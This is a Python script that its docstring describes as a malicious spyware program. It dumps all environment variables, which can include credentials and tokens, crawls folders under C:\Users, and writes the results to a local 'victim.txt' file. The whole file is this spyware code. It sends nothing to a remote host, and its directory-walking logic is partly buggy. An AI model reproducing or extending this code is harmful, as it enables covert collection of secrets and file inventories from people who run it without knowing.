'''
__author__ = 'mmms'
exploit the os module to create a malicious spyware program
'''

import os
PATH = r"C:\Users\mmms\Desktop\project\random_file_lib\Spyware\victim.txt"
os.remove(PATH)

class Spyware:
    def __init__(self):
        pass
    def pc_info(self):
        info_li = []
        for k, v in os.environ.items():
            info_li.append(f'{k}   :   {v}')
        return info_li

    def inspect_c_drive(self):

        all_file_li = []
        cd = os.getcwd().split('\\')
        cd1 = os.path.join('C:\\', cd[1])
        cd2 = os.path.join(cd1, cd[2])
        cd3 = os.path.join(cd2, cd[3])
        cd4 = os.path.join(cd3, cd[4])
        cd_l = [cd1, cd2, cd3, cd4]
        for i in range(len(cd_l)):
            for j in os.listdir(cd_l[i]):
                if i == 1:
                    p1 = os.path.join(cd1, j)
                    if not os.path.isfile(p1):
                        r1 = os.path.join(p1, '\\')
                        if os.path.exists(r1):
                            for k in os.listdir(r1):
                                t1 = os.path.join(p1, k)
                                if not os.path.isfile(t1):
                                    for l in os.listdir(os.path.join(t1, '\\')):
                                        if os.path.exists(os.path.join(os.path.join(t1, l), '\\')):
                                            all_file_li.append(os.path.join(t1, l))

                                else:
                                    all_file_li.append(k)

                    else:
                        all_file_li.append(j)
                if i == 2:
                    p2 = os.path.join(cd2, j)
                    if not os.path.isfile(p1):
                        r2 = os.path.join(p2, '\\')
                        if os.path.exists(r2):
                            for k in os.listdir(r2):
                                t2 = os.path.join(p2, k)
                                if not os.path.isfile(t2):
                                    for l in os.listdir(os.path.join(t2, '\\')):
                                        if os.path.exists(os.path.join(os.path.join(t2, l), '\\')):
                                            all_file_li.append(os.path.join(t2, l))

                                else:
                                    all_file_li.append(k)

                    else:
                        all_file_li.append(j)
                if i == 3:
                    p3 = os.path.join(cd3, j)
                    if not os.path.isfile(p3):
                        r3 = os.path.join(p3, '\\')
                        if os.path.exists(r3):
                            for k in os.listdir(r3):
                                t3 = os.path.join(p3, k)
                                if not os.path.isfile(t3):
                                    for l in os.listdir(os.path.join(t3, '\\')):
                                        if os.path.exists(os.path.join(os.path.join(t3, l), '\\')):
                                            all_file_li.append(os.path.join(t3, l))

                                else:
                                    all_file_li.append(k)

                    else:
                        all_file_li.append(j)
                if i == 4:
                    p4 = os.path.join(cd4, j)
                    if not os.path.isfile(p4):
                        r4 = os.path.join(p4, '\\')
                        if os.path.exists(r4):
                            for k in os.listdir(r4):
                                t4 = os.path.join(p4, k)
                                if not os.path.isfile(t4):
                                    for l in os.listdir(os.path.join(t4, '\\')):
                                        if os.path.exists(os.path.join(os.path.join(t4, l), '\\')):
                                            all_file_li.append(os.path.join(t4, l))

                                else:
                                    all_file_li.append(k)

                    else:
                        all_file_li.append(j)

        return all_file_li





def wrapper_func(args):
    return '-'*(len(args)+6) + '\n' + args + '\n'
def create_txt(string):
    if not os.path.exists(PATH):
            with open(PATH, 'w') as fp:
                fp.write(string)
    else:
        for item in string:
            with open(PATH, 'a') as fp:
                fp.write(wrapper_func(item))


spy = Spyware()
create_txt('*'*5 + '  SPY RESULT  ' + '*'*5 + '\n'*3)
info_str = spy.pc_info()
create_txt(info_str)
file_li = spy.inspect_c_drive()
create_txt(file_li)



